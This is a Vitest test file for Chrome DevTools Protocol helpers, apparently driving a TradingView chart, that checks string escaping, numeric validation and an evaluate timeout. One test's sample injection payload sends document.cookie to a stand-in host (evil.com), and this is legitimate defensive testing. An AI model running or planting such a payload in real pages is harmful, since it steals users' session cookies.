import { afterEach, describe, expect, it, vi } from "vitest";

vi.mock("chrome-remote-interface", () => ({ default: vi.fn() }));

import CDP from "chrome-remote-interface";
import {
  evaluate,
  getClient,
  requireFinite,
  safeString,
} from "./connection.js";

afterEach(() => {
  vi.clearAllMocks();
  vi.unstubAllGlobals();
});

describe("CDP connection utilities", () => {
  describe("safeString() — CDP injection prevention", () => {
    it("wraps normal strings in double quotes", () => {
      expect(safeString("hello")).toBe('"hello"');
    });

    it("escapes double quotes", () => {
      expect(safeString('test"injection')).toBe('"test\\"injection"');
    });

    it("neutralizes template literals", () => {
      const result = safeString("${alert(1)}");
      expect(JSON.parse(result)).toBe("${alert(1)}");
    });

    it("escapes newlines", () => {
      const result = safeString("line1\nline2");
      expect(result).not.toContain("\n");
      expect(result).toContain("\\n");
    });

    it("prevents classic CDP injection payload", () => {
      const payload =
        "'); fetch('https://evil.com/steal?c=' + document.cookie); ('";
      const result = safeString(payload);
      expect(JSON.parse(result)).toBe(payload);
    });
  });

  describe("requireFinite() — numeric validation", () => {
    it("passes finite numbers through", () => {
      expect(requireFinite(42, "test")).toBe(42);
      expect(requireFinite(3.14, "test")).toBe(3.14);
    });

    it("rejects NaN", () => {
      expect(() => requireFinite(NaN, "price")).toThrow(
        /price must be a finite number/,
      );
    });

    it("rejects Infinity", () => {
      expect(() => requireFinite(Infinity, "time")).toThrow(
        /time must be a finite number/,
      );
    });

    it("rejects non-numeric strings", () => {
      expect(() => requireFinite("abc", "value")).toThrow(
        /value must be a finite number/,
      );
    });
  });

  describe("evaluate() timeout", () => {
    it("clears its settle timer after evaluation succeeds", async () => {
      const runtimeEvaluate = vi
        .fn()
        .mockResolvedValue({ result: { value: undefined } });
      const client = {
        on: vi.fn(),
        Runtime: { enable: vi.fn(), evaluate: runtimeEvaluate },
        Page: { enable: vi.fn(), addScriptToEvaluateOnNewDocument: vi.fn() },
        DOM: { enable: vi.fn() },
      };
      vi.mocked(CDP).mockResolvedValue(client as never);
      vi.stubGlobal(
        "fetch",
        vi.fn().mockResolvedValue({
          json: vi
            .fn()
            .mockResolvedValue([
              {
                id: "chart",
                type: "page",
                url: "https://www.tradingview.com/chart/",
                title: "Chart",
              },
            ]),
        }),
      );

      await getClient();
      const clearTimeoutSpy = vi.spyOn(globalThis, "clearTimeout");
      clearTimeoutSpy.mockClear();
      runtimeEvaluate.mockResolvedValue({ result: { value: 42 } });

      await expect(evaluate("42", { timeout: 1_000 })).resolves.toBe(42);
      expect(clearTimeoutSpy).toHaveBeenCalledTimes(1);
    });
  });
});
